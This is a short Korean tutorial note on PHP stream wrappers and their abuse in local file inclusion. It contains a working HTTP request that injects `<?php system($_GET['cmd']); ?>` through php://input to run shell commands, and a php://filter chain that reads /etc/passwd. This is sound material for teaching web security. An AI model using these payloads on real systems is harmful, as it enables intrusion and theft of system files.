# PHP Stream Wrapper

## php://
PHP는 PHP 자체의 입출력 스트림, 표준 입출력, 오류 파일 서술자, 다른 파일 리소스를 읽고 쓸 때 조작할 수 있는 필터 등 여러 I/O 스트림을 제공한다.

### php://input
`php://input` 은 요청의 body 부분에서 원시 데이터를 읽을 수 있는 읽기 전용 스트림이다.

```
POST http://www.example.com?go=php://input&cmd=ls HTTP/1.1
Host: example.com
Content-Length: 30

<?php system($_GET["cmd"]); ?>
```

프록시 툴에서 위와 같이 요청을 보내면 PHP 구문이 삽입되고 `system()` 함수가 작동하여 디렉토리의 파일 리스트를 보여주게 된다. `http://` 또는 `file://` wrapper가 필터링 된 경우에 위와 같은 취약점을 이용할 수 있다.

### php://filter
`php://filter` 는 스트림을 열 때 필터를 적용할 수 있도록 설계된 meta-wrapper의 한 종류이다. 내용을 읽기 전에 필터를 적용할 수 없는 `readfile()` 이나 `file_get_contents()` 와 같은 함수들을 사용하는 경우에 유용하다.

`read` 파라미터에 필터를 적용하여 필터링된 파일의 내용을 읽을 수 있다. `resource` 파라미터는 필터링 할 파일을 의미한다. 파라미터들은 `/` 로 이어 체인을 형성할 수 있다. 예시는 다음과 같다.

```
php://filter/read=string.rot13/resource=/etc/passwd
```

아래에 나열된 필터들은 LFI에서 파일의 내용을 확인하기 위해 주로 사용하는 것들을 정리한 것이다.

#### String Filters
- string.rot13
- string.toupper
- string.tolower

각각 `str_rot13()`, `strtoupper()`, `strtolower()` 함수를 통해 모든 스트림 데이터를 처리하는 것과 동일하다.

#### Conversion Filters
- convert.base64-encode

`base64_encode()` 함수를 통해 스트림 데이터를 처리하는 것과 동일하다.

## References
- https://www.php.net/manual/en/wrappers.php.php
- https://www.netsparker.com/blog/web-security/php-stream-wrappers/
- https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
